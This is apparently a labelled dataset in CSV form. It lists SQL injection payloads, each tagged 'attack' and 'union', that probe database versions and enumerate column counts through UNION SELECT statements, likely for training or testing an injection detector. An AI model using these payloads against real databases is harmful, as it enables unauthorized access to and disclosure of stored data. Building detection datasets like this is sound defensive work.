label,payload,family
attack," select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",union
attack," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",union
attack," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",union
attack," select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",union
attack," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",union
attack," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",union
attack," select * from users where id  =  '1' + $+*$ union select 1,@@VERSION -- 1'",union
attack," select * from users where id  =  1 or \.<$ union select 1,@@VERSION -- 1",union
attack," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",union
attack," select * from users where id  =  '1'<@$$ union select 1,version  (    )   -- 1'",union
attack," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",union
attack," select * from users where id  =  1 union select @&&@,version  (    )   -- 1",union
attack,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",union
attack,"1  )   union all select null,null,null,null,null,null,null,null,null--",union
attack,"-4373'+  (  select 'rlht' where 2285  =  2285 union all select 2285,2285,2285#",union
attack,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",union
attack,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",union
attack,"1'  )   union all select null,null,null,null,null,null#",union
attack,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",union
attack,"1%'  )   union all select null,null,null,null,null,null#",union
attack,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",union
attack,"1 union all select null,null,null,null,null,null,null,null--",union
attack,"1%' union all select null,null,null,null,null,null,null,null--",union
attack,"-8772%' union all select 4909,4909,4909,4909,4909,4909,4909,4909,4909#",union
attack,"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",union
attack,"-9156'   )    )    union all select 9110,9110,9110,9110#",union
attack,"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",union
attack,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",union
attack,"1   )    )     )   union all select null,null,null,null,null,null#",union
attack,"-6667%""   )    )    union all select 7348,7348,7348,7348,7348,7348,7348,7348#",union
attack,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",union
attack,"1%' union all select null,null,null,null,null,null,null#",union
attack,"1'  )   union all select null,null,null,null,null,null--",union
attack,"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",union
attack,"-4966%"" union all select 4300,4300,4300,4300,4300,4300,4300,4300#",union
attack,"1%' union all select null,null,null,null,null,null,null,null,null,null--",union
attack,"-4589""  )   union all select 1441,1441,1441,1441,1441,1441,1441,1441,1441,1441--",union
attack,"-1134 union all select 1297,1297,1297,1297,1297,1297,1297,1297,1297--",union
attack,"-9860%"" union all select 6996,6996,6996,6996,6996,6996#",union
attack,1'  )   as gogu where 4338  =  4338 union all select null#,union
attack,"1'   )    )     )   union all select null,null,null,null,null,null,null#",union
attack,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null#",union
attack,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",union
attack,"1%""   )    )    union all select null,null,null,null,null#",union
attack,"-2639""  )   where 1494  =  1494 union all select 1494--",union
attack,"1'  )   union all select null,null,null,null,null,null,null,null,null--",union
attack,"-7296%'   )    )     )   union all select 9322,9322,9322,9322--",union
attack,"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null#",union
attack,"-5131'   )    )     )   union all select 4854,4854,4854,4854,4854,4854,4854#",union
attack,"-1894'  )   union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",union
attack,"-4205' union all select 8986,8986,8986,8986,8986,8986,8986,8986,8986,8986#",union
attack,"-6294"" union all select 9921,9921,9921,9921,9921,9921--",union
attack,"1""  )   where 2088  =  2088 union all select null,null,null,null--",union
attack,"1' union all select null,null,null,null,null,null,null,null,null--",union
attack,"-6253' union all select 5756,5756,5756,5756,5756,5756,5756,5756,5756,5756#",union
attack,"1""  )   as boeh where 2571  =  2571 union all select null#",union
attack,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",union
